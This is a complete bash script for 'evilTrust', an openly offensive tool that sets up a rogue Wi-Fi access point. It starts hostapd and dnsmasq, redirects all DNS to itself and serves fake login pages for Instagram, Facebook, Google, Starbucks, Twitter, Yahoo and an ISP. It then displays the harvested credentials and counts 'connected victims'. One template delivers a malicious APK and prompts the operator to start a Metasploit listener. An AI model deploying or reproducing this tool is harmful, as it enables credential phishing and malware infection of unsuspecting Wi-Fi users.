#!/bin/bash

# evilTrust v2.0, Author @s4vitar and translated by @Tushar Pandit

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
	rm dnsmasq.conf hostapd.conf 2>/dev/null
	rm -r iface 2>/dev/null
	find \-name private-data.txt | xargs rm 2>/dev/null
	sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
	iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
	ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
	tput cnorm; service network-manager restart
	exit 0
}

function banner(){
echo -e "\n${redColour}╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮"
sleep 0.05
echo -e "╱╱╱╱╱╱╱┃┃╭╮╭╮┃╱╱╱╱╱╭╯╰╮"
sleep 0.05
echo -e "╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯"
sleep 0.05
echo -e "┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃     ${endColour}${yellowColour}(${endColour}${grayColour}Made by ${endColour}${blueColour}s4vitar${endColour}${grayColour} & Translated by ${endColour}${blueColour}pandatttushar${endColour}${yellowColour})${endColour}${redColour}"
sleep 0.05
echo -e "┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮"
sleep 0.05
echo -e "╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯${endColour}"
sleep 0.05
}

function dependencies(){
	sleep 1.5; counter=0
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Checking necessary programs...\n"
	sleep 1

	dependencias=(php dnsmasq hostapd)

	for programa in "${dependencias[@]}"; do
		if [ "$(command -v $programa)" ]; then
			echo -e ". . . . . . . . ${blueColour}[V]${endColour}${grayColour} The tool${endColour}${yellowColour} $programa${endColour}${grayColour} is installed"
			let counter+=1
		else
			echo -e "${redColour}[X]${endColour}${grayColour} The tool${endColour}${yellowColour} $programa${endColour}${grayColour} is not installed"
		fi; sleep 0.4
	done

	if [ "$(echo $counter)" == "3" ]; then
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting...\n"
		sleep 3
	else
		echo -e "\n${redColour}[!]${endColour}${grayColour} It is necessary to have the php, dnsmasq and hostapd tools installed to run this script${endColour}\n"
		tput cnorm; exit
	fi
}

function getCredentials(){

	activeHosts=0
	tput civis; while true; do
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Waiting for credentials (${endColour}${redColour}Ctr+C To finish${endColour}${grayColour})...${endColour}\n${endColour}"
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		echo -e "${redColour}Connected victims: ${endColour}${blueColour}$activeHosts${endColour}\n"
		find \-name private-data.txt | xargs cat 2>/dev/null
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
		sleep 3; clear
	done
}

function startAttack(){
	clear; if [[ -e credenciales.txt ]]; then
		rm -rf credenciales.txt
	fi

	echo -e "\n${yellowColour}[*]${endColour} ${purpleColour} Listing available network interfaces...${endColour}"; sleep 1

	# If the interface has another name, change it at this point (we consider that it is called wlan0 by default)
	airmon-ng start wlan0 > /dev/null 2>&1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
	counter=1; for interface in $(cat iface); do
		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
		let counter++
	done; tput cnorm
	checker=0; while [ $checker -ne 1 ]; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Interface name (Ex: wlan0mon): ${endColour}" && read choosed_interface

		for interface in $(cat iface); do
			if [ "$choosed_interface" == "$interface" ]; then
				checker=1
			fi
		done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} The provided interface does not exist${endColour}"; fi
	done

	rm iface 2>/dev/null
	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Name of the access point to use (Ex: Free Wifi):${endColour} " && read -r use_ssid
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Channel to use (1-12):${endColour} " && read use_channel; tput civis
	echo -e "\n${redColour}[!] Killing all connections...${endColour}\n"
	sleep 2
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	sleep 5

	echo -e "interface=$choosed_interface\n" > hostapd.conf
	echo -e "driver=nl80211\n" >> hostapd.conf
	echo -e "ssid=$use_ssid\n" >> hostapd.conf
	echo -e "hw_mode=g\n" >> hostapd.conf
	echo -e "channel=$use_channel\n" >> hostapd.conf
	echo -e "macaddr_acl=0\n" >> hostapd.conf
	echo -e "auth_algs=1\n" >> hostapd.conf
	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

	echo -e "${yellowColour}[*]${endColour}${grayColour} Configuring interface $choosed_interface${endColour}\n"
	sleep 2
	echo -e "${yellowColour}[*]${endColour}${grayColour} Starting hotspot...${endColour}"
	hostapd hostapd.conf > /dev/null 2>&1 &
	sleep 6

	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configuring dnsmasq...${endColour}"
	echo -e "interface=$choosed_interface\n" > dnsmasq.conf
	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
	echo -e "log-queries\n" >> dnsmasq.conf
	echo -e "log-dhcp\n" >> dnsmasq.conf
	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

	ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
	sleep 1
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	sleep 1
	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
	sleep 5

	# Template array
	plantillas=(instagram-login facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)

	tput cnorm; echo -ne "\n${blueColour}[Information]${endColour}${yellowColour} If you want to use your own template, create another directory in the project and specify its name:)${endColour}\n\n"
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Template to use (instagram-login, facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template

	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
		if [ "$plantilla" == "$template" ]; then
			check_plantillas=1
		fi
	done

	if [ "$template" == "cliqq-payload" ]; then
		check_plantillas=2
	fi

	if [ $check_plantillas -eq 1 ]; then
		tput civis; pushd $template > /dev/null 2>&1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Mounting PHP server...${endColour}"
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		popd > /dev/null 2>&1; getCredentials
	elif [ $check_plantillas -eq 2 ]; then
		tput civis; pushd $template > /dev/null 2>&1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Mounting PHP server...${endColour}"
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configure from another console a Listener in Metasploit as follows:${endColour}"
		for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		cat msfconsole.rc
		for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		echo -e "\n${redColour}[!] Press <Enter> to continue${endColour}" && read
		popd > /dev/null 2>&1; getCredentials
	else
		tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Using custom template...${endColour}"; sleep 1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Mounting web server in${endColour}${blueColour} $template${endColour}\n"; sleep 1
		pushd $template > /dev/null 2>&1
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		popd > /dev/null 2>&1; getCredentials
	fi
}

function helpPanel(){
	echo -e "\n${redColour}╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮"
	sleep 0.05
	echo -e "╱╱╱╱╱╱╱┃┃╭╮╭╮┃╱╱╱╱╱╭╯╰╮"
	sleep 0.05
	echo -e "╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯"
	sleep 0.05
	echo -e "┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃   ${endColour}${yellowColour}(${endColour}${grayColour}Made by ${endColour}${blueColour}s4vitar${endColour}${grayColour} & Translated by ${endColour}${blueColour}pandatttushar${endColour}${yellowColour})${endColour}${redColour}"
    sleep 0.05
	echo -e "┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮"
	sleep 0.05
	echo -e "╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯${endColour}"
	echo -e "\n${grayColour}Uso:${endColour}"
	echo -e "\t${redColour}[-m]${endColour}${blueColour} Execution mode ${endColour}${yellowColour} (terminal|gui)${endColour}${purpleColour} [-m terminal | -m gui]${endColour}"
	echo -e "\t${redColour}[-h]${endColour}${blueColour} Show this help panel${endColour}\n"
	exit 1
}

function guiMode(){
	whiptail --title "evilTrust - by S4vitar & Translated by pandatttushar" --msgbox "Welcome to evilTrust, an ideal offensive tool to deploy a Rogue AP to your liking." 8 78
	whiptail --title "evilTrust - by S4vitar & Translated by pandatttushar" --msgbox "Let it check that you have all the necessary programs before you start..." 8 78

	tput civis; dependencias=(php dnsmasq hostapd)

        counter_dep=0; for programa in "${dependencias[@]}"; do
                if [ "$(command -v $programa)" ]; then
                        let counter_dep+=1
                fi; sleep 0.4
        done

        if [ $counter_dep -eq "3" ]; then
		whiptail --title "evilTrust - by S4vitar & Translated by pandatttushar" --msgbox "Perfect, it seems that you have everything you need..." 8 78
		tput civis
        else
		whiptail --title "evilTrust - by S4vitar & Translated by pandatttushar" --msgbox "It is seen that you are missing some dependencies, I need you to have the php, dnsmasq and hostapd utilities installed" 8 78
                exit 1
        fi

	tput civis; if [[ -e credenciales.txt ]]; then
                rm -rf credenciales.txt
        fi

	whiptail --title "evilTrust - by S4vitar Translated by pandatttushar" --msgbox "Next, I will list your available network interfaces, I will need you to choose the one that accepts the monitor mode" 8 78

	tput civis; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
        counter=1; for interface in $(cat iface); do
                let counter++
        done
        checker=0; while [ $checker -ne 1 ]; do
		choosed_interface=$(whiptail --inputbox "Available network interfaces:\n\n$(ifconfig | cut -d ' ' -f 1 | xargs | tr -d ':' | tr ' ' '\n' | while read line; do echo "[*] $line"; done)" 13 78 --title "evilTrust - Red interfaces" 3>&1 1>&2 2>&3)
                for interface in $(cat iface); do
                        if [ "$choosed_interface" == "$interface" ]; then
                                checker=1
                        fi
                done; if [ $checker -eq 0 ]; then whiptail --title "evilTrust - Error en la selección de interfaz" --msgbox "La interfaz proporcionada no existe, vuelve a introducir la interfaz y asegúrate de que sea correcta" 8 78; fi
        done

	tput civis; whiptail --title "evilTrust - by S4vitar & Translated by pandatttushar" --msgbox "Next you will configure the interface $choosed_interface in monitor mode..." 8 78
	tput civis; airmon-ng start $choosed_interface > /dev/null 2>&1; choosed_interface="${choosed_interface}mon"

	rm iface 2>/dev/null
	use_ssid=$(whiptail --inputbox "Enter the name of the access point to use (Ex: Free Wifi):" 8 78 --title "evilTrust - by S4vitar & Translated by pandatttushar" 3>&1 1>&2 2>&3)
	whiptail --title "evilTrust - by S4vitar & Translated by pandatttushar" --checklist \
	"Select the channel under which you want the access point to operate (Press the <SPACE> key to select)" 20 78 12 \
	1 "(Use this channel) " OFF \
	2 "(Use this channel) " OFF \
        3 "(Use this channel) " OFF \
        4 "(Use this channel) " OFF \
        5 "(Use this channel) " OFF \
        6 "(Use this channel) " OFF \
        7 "(Use this channel) " OFF \
        8 "(Use this channel) " OFF \
        9 "(Use this channel) " OFF \
        10 "(Use this channel) " OFF \
        11 "(Use this channel) " OFF \
	12 "(Use this channel) " OFF 2>use_channel

	use_channel=$(cat use_channel | tr -d '"'); rm use_channel

	whiptail --title "evilTrust - by S4vitar & Translated by pandatttushar" --msgbox "Perfect, I'm going to create some configuration files for you to deploy the attack..." 8 78

	tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configuring... (This process takes a few seconds)${endColour}"
        sleep 2
        killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
        sleep 5

        echo -e "interface=$choosed_interface\n" > hostapd.conf
        echo -e "driver=nl80211\n" >> hostapd.conf
        echo -e "ssid=$use_ssid\n" >> hostapd.conf
        echo -e "hw_mode=g\n" >> hostapd.conf
        echo -e "channel=$use_channel\n" >> hostapd.conf
        echo -e "macaddr_acl=0\n" >> hostapd.conf
        echo -e "auth_algs=1\n" >> hostapd.conf
        echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

        sleep 2
        hostapd hostapd.conf > /dev/null 2>&1 &
        sleep 6

        echo -e "interface=$choosed_interface\n" > dnsmasq.conf
        echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
        echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
        echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
        echo -e "server=8.8.8.8\n" >> dnsmasq.conf
        echo -e "log-queries\n" >> dnsmasq.conf
        echo -e "log-dhcp\n" >> dnsmasq.conf
        echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
        echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

        ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
        sleep 1
        route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
        sleep 1
        dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
        sleep 5

        # Template array
        plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)

	whiptail --title "evilTrust - by S4vitar & Translated by pandatttushar" --msgbox "Done!, time to choose your template" 8 78

        whiptail --title "evilTrust - by S4vitar & Translated by pandatttushar" --checklist --separate-output "Select the template you want to use" 20 103 12 \
        facebook-login "Login template Facebook" OFF \
        google-login "Login template Google" OFF \
        starbucks-login "Login template Starbucks" OFF \
        twitter-login "Login template Twitter" OFF \
        yahoo-login "Login template yahoo" OFF \
        all_in_one "All-in-one template (Multiple centralized portals)" OFF \
        cliqq-payload "Malicious APK display template" OFF \
        optimumwifi "Login template for WiFi usage (ISP Selection)" OFF \
	    Custom "Using custom template" OFF 2>template

	template=$(cat template | tr -d '"'); rm template

        check_plantillas=0; for plantilla in "${plantillas[@]}"; do
                if [ "$plantilla" == "$template" ]; then
                        check_plantillas=1
                fi
        done

        if [ "$template" == "cliqq-payload" ]; then
                check_plantillas=2
        fi; clear

        if [ $check_plantillas -eq 1 ]; then
		whiptail --title "evilTrust - by S4vitar & Translated by pandatttushar" --msgbox "Ready for battle!, soon the access point will be mounted and it will be a matter of waiting for your victims to connect" 8 78
                tput civis; pushd $template > /dev/null 2>&1
                php -S 192.168.1.1:80 > /dev/null 2>&1 &
                sleep 2
                popd > /dev/null 2>&1; getCredentials
        elif [ $check_plantillas -eq 2 ]; then
		whiptail --title "evilTrust - by S4vitar & Translated by pandatttushar" --msgbox "Ready for battle!, soon the access point will be mounted and it will be a matter of waiting for your victims to connect" 8 78
                tput civis; pushd $template > /dev/null 2>&1
                php -S 192.168.1.1:80 > /dev/null 2>&1 &
                sleep 2
		whiptail --title "evilTrust - by S4vitar & Translated by pandatttushar" --msgbox "Configure from another console a Listener in Metasploit as follows:\n\n$(cat msfconsole.rc)" 15 78
                popd > /dev/null 2>&1; getCredentials
	else
		whiptail --title "evilTrust - by S4vitar & Translated by pandatttushar" --msgbox "I see you prefer to use your own template, wise choice :)" 8 78
		template=$(whiptail --title "evilTrust - by S4vitar & Translated by pandatttushar" --inputbox "Well, let's do it!, tell me the name of your template (You must create a directory with the same name):" 13 78 --title "evilTrust - Custom template" 3>&1 1>&2 2>&3)
                pushd $template > /dev/null 2>&1
                php -S 192.168.1.1:80 > /dev/null 2>&1 &
                sleep 2
                popd > /dev/null 2>&1; getCredentials
        fi
}

# Main Program

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_enable=0; while getopts ":m:h:" arg; do
		case $arg in
			m) mode=$OPTARG && let parameter_enable+=1;;
			h) helpPanel;;
		esac
	done

	if [ $parameter_enable -ne 1 ]; then
		helpPanel
	else
		if [ "$mode" == "terminal" ]; then
			tput civis; banner
			dependencies
			startAttack
		elif [ "$mode" == "gui" ]; then
			guiMode
		else
			echo -e "Mode not known"
			exit 1
		fi
	fi
else
	echo -e "\n${redColour}[!] You need to be root to run the tool${endColour}"
	exit 1
fi
